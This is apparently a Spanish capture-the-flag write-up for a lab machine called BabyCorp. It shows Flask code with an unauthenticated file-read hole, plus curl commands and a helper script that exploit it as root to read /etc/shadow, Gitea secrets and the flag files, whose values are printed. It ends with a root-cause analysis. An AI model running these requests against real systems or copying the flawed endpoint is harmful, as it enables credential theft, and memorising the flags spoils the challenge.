# BabyCorp — The Hackers Labs (Linux)

> [!info] Nota
> CTF independiente (Linux / BabyCorp, `192.168.56.102`). Writeup creado el 2026-10-19.

## Estado
✅ Resuelto (2026-10-19)

## Entorno
- Objetivo: `192.168.56.102`
- SO: Linux (Debian 12)
- Hipervisor: VirtualBox (Host-Only)
- MAC: `08:00:27:BA:3C:7E`

## Flags
- **USER:** `THL{wvv3r3z_th3_g04t}`
- **ADMIN/ROOT:** `THL{djabndkasbnFfafhafaghdh18bdajkdbasdbasahsdbghajsbdahsdjasd}`

## Reconocimiento
Escaneo de puertos (`nmap -sS -sV -p-`):

| Puerto | Servicio |
|--------|----------|
| 22   | OpenSSH 9.2p1 Debian |
| 3000 | Gitea "BabyCorp" (cookie `i_like_gitea`) |
| 3306 | MariaDB |
| 5000 | Flask / Werkzeug 3.1.8 (web BabyCorp) |
| 9000 | Servicio custom (`This is almost exactly the same as jump...`) |

## Fuga de código fuente (Gitea)
En Gitea había un repo **público** `wvverez/BabyCorp-Web-Project`:

```bash
curl -s "http://192.168.56.102:3000/api/v1/repos/search?limit=50"
git clone http://192.168.56.102:3000/wvverez/BabyCorp-Web-Project.git
```

Al revisar `app.py` se encuentra el endpoint vulnerable.

## Vulnerabilidad — Lectura arbitraria de archivos (LFI)
El endpoint `POST /api/load-file` abre cualquier ruta **sin autenticación ni sanitización**:

```python
@app.route('/api/load-file', methods=['POST'])
def load_file():
    filename = request.form.get('file', '')
    with open(filename, 'r') as f:   # <-- path traversal total
        content = f.read()
    return jsonify({"success": True, "content": content})
```

Explotación:

```bash
curl -s http://192.168.56.102:5000/api/load-file --data-urlencode "file=/etc/passwd"
```

> La respuesta llega en base64 (`"encoding":"base64"`).

### Helper usado
```bash
#!/bin/bash
curl -s http://192.168.56.102:5000/api/load-file --data-urlencode "file=$1" \
 | python3 -c "import sys,json,base64; d=json.load(sys.stdin); c=d.get('content'); \
   print(base64.b64decode(c).decode('utf-8','replace') if d.get('encoding')=='base64' and c else (c or d.get('error')))"
```

## Escalada "gratis" a root
El servicio Flask **corre como root** (`/proc/self/status` → `Uid: 0`):

```bash
./lfi.sh /proc/self/cmdline   # /usr/bin/python3 /var/www/html/web/app.py
./lfi.sh /proc/self/status | grep Uid   # Uid: 0 0 0 0
```

Por tanto el LFI equivale a lectura arbitraria **como root**:

```bash
./lfi.sh /home/dev_wvverez/user.txt   # USER flag
./lfi.sh /root/root.txt               # ADMIN/ROOT flag
./lfi.sh /etc/shadow                  # prueba de acceso root
./lfi.sh /etc/gitea/app.ini           # secretos de DB de Gitea
```

Usuarios del sistema (de `/etc/passwd`): `root`, `babydev` (1000), `softwaredepartment` (1001), `git` (102), `dev_wvverez` (1002).

## Causa raíz
1. Endpoint de lectura de archivos sin validación de ruta ni control de acceso.
2. Servicio web ejecutándose como **root** en lugar de un usuario sin privilegios.

Corregir cualquiera de los dos evita el compromiso total.

## Pendiente / notas
- Puerto 9000 (`jump`) no fue necesario: probablemente reto de pwn alternativo para escalar sin el fallo de root.
